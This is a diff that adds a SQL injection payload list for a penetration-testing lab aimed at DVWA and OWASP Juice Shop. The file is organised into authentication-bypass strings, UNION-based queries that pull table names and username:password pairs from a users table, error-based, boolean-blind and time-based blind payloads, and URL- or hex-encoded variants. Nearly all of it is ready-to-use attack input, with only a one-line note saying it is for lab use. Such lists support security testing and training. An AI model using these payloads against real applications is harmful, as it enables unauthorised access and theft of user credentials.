@@ -1,0 +1,65 @@
+# SQL Injection Payloads — VAPT Lab
+# Used in testing DVWA and OWASP Juice Shop
+# FOR EDUCATIONAL USE IN LAB ENVIRONMENTS ONLY
+
+# ========================================
+# AUTHENTICATION BYPASS
+# ========================================
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+' OR 1=1--
+' OR 1=1#
+admin'--
+admin' #
+admin'/*
+') OR ('1'='1
+') OR ('1'='1'--
+' OR 'x'='x
+1' OR '1'='1
+' OR 1=1 LIMIT 1--
+
+# ========================================
+# UNION-BASED EXTRACTION
+# ========================================
+' UNION SELECT null--
+' UNION SELECT null,null--
+' UNION SELECT null,null,null--
+' UNION SELECT 1,database()--
+' UNION SELECT 1,user()--
+' UNION SELECT 1,version()--
+' UNION SELECT 1,table_name FROM information_schema.tables--
+' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT 1,concat(username,0x3a,password) FROM users--
+1' UNION SELECT null, concat(user,0x3a,password) FROM users--
+
+# ========================================
+# ERROR-BASED
+# ========================================
+' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))--
+' AND UPDATEXML(1,CONCAT(0x7e,database()),1)--
+1' AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+
+# ========================================
+# BOOLEAN-BASED BLIND
+# ========================================
+' AND 1=1--
+' AND 1=2--
+' AND substring(database(),1,1)='d'--
+' AND length(database())=7--
+
+# ========================================
+# TIME-BASED BLIND
+# ========================================
+' AND SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+1'; SELECT SLEEP(5)--
+' OR SLEEP(5)--
+
+# ========================================
+# SPECIAL CHARACTERS & ENCODING
+# ========================================
+%27 OR 1=1--
+%22 OR %221%22=%221
+%27%20OR%20%271%27%3D%271
+0x27 OR 0x313d31--
